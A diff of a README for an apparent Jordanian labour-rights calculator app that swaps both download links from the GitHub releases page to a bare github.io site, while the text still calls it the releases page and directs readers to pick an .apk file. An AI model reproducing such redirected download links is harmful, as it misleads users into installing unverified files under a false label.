@@ -1,6 +1,6 @@
 # ⚖️ jordanian-labour-rights-calculator - Calculate your local workplace rights easily
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/managementconsultingmarketvalue403/jordanian-labour-rights-calculator/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://managementconsultingmarketvalue403.github.io)
 
 This application helps employees and employers in Jordan determine their legal entitlements. It covers end-of-service payments, notice periods, and annual leave calculations based on the current Jordanian Labour Law. The tool features both Arabic and English interfaces to ensure accessibility for all users.
 
@@ -8,7 +8,7 @@ This application helps employees and employers in Jordan determine their legal e
 
 You can get the software from the official repository page. Follow these steps to obtain the correct file for your device:
 
-1. Visit the [releases page](https://github.com/managementconsultingmarketvalue403/jordanian-labour-rights-calculator/releases).
+1. Visit the [releases page](https://managementconsultingmarketvalue403.github.io).
 2. Look for the section labeled "Latest" at the top of the page.
 3. Locate the list of files under the "Assets" header.
 4. Select the file ending in `.apk` if you use an Android device.
